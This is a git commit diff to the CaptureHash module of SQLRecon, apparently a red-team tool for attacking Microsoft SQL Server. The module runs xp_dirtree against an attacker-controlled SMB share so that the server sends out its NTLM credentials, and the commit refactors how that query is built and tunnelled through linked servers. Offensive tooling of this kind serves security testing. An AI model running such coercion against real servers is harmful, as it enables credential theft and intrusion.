ae55b6a33a191656676d962cad83faed293ec745
n3rada <72791564+n3rada@users.noreply.github.com>
2024-05-30 12:05:27 +0200

    Correct my mistake on `CaptureHash`

--- SQLRecon/SQLRecon/modules/CaptureHash.cs
+++ SQLRecon/SQLRecon/modules/CaptureHash.cs
@@ -15,17 +15,13 @@ namespace SQLRecon.Modules
         /// <param name="tunnelSqlServers">A list of SQL Servers forming the tunnel path, if specified</param>
         public CaptureHash(SqlConnection con, string smbShare, string[] tunnelSqlServers = null)
         {
+            string query = $"EXEC master..xp_dirtree '{smbShare}';";
             if (tunnelSqlServers != null && tunnelSqlServers.Length > 0)
             {
-                // Construct the query to send the SMB request through the tunnel
-                string query = $"EXEC master..xp_dirtree '\\\\{smbShare}\\share'";
-                string result = _sqlQuery.ExecuteTunnelCustomQuery(con, tunnelSqlServers, query);
+                string result = _sqlQuery.ExecuteTunnelCustomQuery(con, tunnelSqlServers, $"SELECT 1; {query}");
+                return ;
             }
-            else
-            {
-                // Directly send the SMB request
-                _sqlQuery.ExecuteCustomQuery(con, $"EXEC master..xp_dirtree '\\\\{smbShare}\\share';");
-            }
+            _sqlQuery.ExecuteCustomQuery(con, $"EXEC master..xp_dirtree '{smbShare}';");
         }
     }
 }
